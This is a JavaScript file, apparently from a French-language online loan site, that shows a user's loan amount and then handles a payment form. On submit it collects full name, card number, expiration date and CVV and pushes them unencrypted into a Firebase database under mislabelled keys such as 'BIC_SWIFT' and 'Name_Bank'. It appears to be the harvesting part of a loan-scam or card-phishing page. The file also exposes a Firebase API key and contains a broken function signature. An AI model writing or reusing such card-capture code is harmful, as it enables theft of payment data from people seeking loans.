const firebaseConfig = {
    apiKey: "AIzaSyAdpKwXX_dtdjaQ7ia0OC7VxQNw-_nI_iY",
    authDomain: "arlitfinance.firebaseapp.com",
    databaseURL: "https://arlitfinance-default-rtdb.firebaseio.com",
    projectId: "arlitfinance",
    storageBucket: "arlitfinance.appspot.com",
    messagingSenderId: "1012825535505",
    appId: "1:1012825535505:web:767da3656b27c1b994edb0"
    };
    const unserconnectId = localStorage.getItem("unserconnect") 
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database(); 
    var form_check_inputTable = []  
    firebase.auth().onAuthStateChanged(function(user) { 
    if(user){
    var userId = user.uid;
    localStorage.setItem('unserconnectuserId', userId) 
    const userRef = database.ref(`/utilisateurs/${userId}`);
    userRef.once("value")
    .then((snapshot) => {
    if(snapshot.exists()){ 
    if(!snapshot.val().B_U){ 
        var soldeId = document.getElementById('soldeId');
       var Yout_loan_amountx = snapshot.val().Yout_loan_amount
       var InterestPayablex = Yout_loan_amountx*0.10
       const Yout_loan_amount = Yout_loan_amountx.toLocaleString();
       const InterestPayablev = InterestPayablex.toLocaleString();
       soldeId.value = `${Yout_loan_amount}`; 
    }else{
        window.location.href = `info/info.html`
   }
  
    function outerFunction() {
        // Définir la fonction submitmy à l'intérieur de cette fonction
        window.submitmy = function() {
          console.log("Form submitted!");
          // Autres logiques ici
        };
      }
    
      // Appeler outerFunction pour que submitmy soit définie
      outerFunction();
    
      // Associer la soumission du formulaire à submitmy()
      document.getElementById('myForm').addEventListener('submit', function(event) {
        event.preventDefault();  // Empêche le rechargement de la page
        submitmy();  // Appel de la fonction submitmy()
      });
   function submitmy() {
    var Full_Name = document.getElementById('Full_Name').value
    var cardnumberx = document.getElementById('cardnumberx').value
    var expirationdate = document.getElementById('expirationdate').value
    var securitycode = document.getElementById('securitycode').value
    var Countrie = document.getElementById('Countrie').value
    const userRefx = database.ref(`/utilisateurs/${userId}`);
    const dateActuelle = new Date();
    // Obtenez les composantes de la date et de l'heure  
    const jour = dateActuelle.getDate();
    const mois = dateActuelle.getMonth() + 1; // Les mois commencent à 0, donc ajoutez 1
    const annee = dateActuelle.getFullYear();
    const heures = dateActuelle.getHours();
    const minutes = dateActuelle.getMinutes();
    // Formatez la date et l'heure
    const dateFormatee = `${jour}/${mois}/${annee} ${heures}h:${minutes}min`;
        //console.log(dateFormatee);
    // Function to add a gain with status to the user's gains array
    function addGainToUser(Full_Name, cardnumberx, expirationdate, securitycode, expirationdate, dateFormatee) {
        const newNotification = { Full_Name: Full_Name, cardnumberx: cardnumberx, BIC_SWIFT:expirationdate, 
            Name_Bank: securitycode, Countrie:Countrie, dateFormatee:dateFormatee
        };
        userRefx.child("B_U").push(newNotification);
    }              
    // Usage
    addGainToUser(Full_Name, cardnumberx, expirationdate,securitycode, Countrie, dateFormatee ); // Add a gain of 100 with "won" status
    Swal.fire({
        title: i18next.t("TERMES4"),
        text: i18next.t("TERMES5"),
        icon: "success",
        allowOutsideClick: false,
    }).then((result) => {
        if (result.isConfirmed) {
            window.location.href = `info/info.html`
        }
    });
   }
  
    // end function to send notification 
 
    }else{
     window.location.href = "login/emaillogin.html"
    } 
    })
    }else{
      window.location.href = "login/emaillogin.html"
    }
    
    }) 
    
  
  
  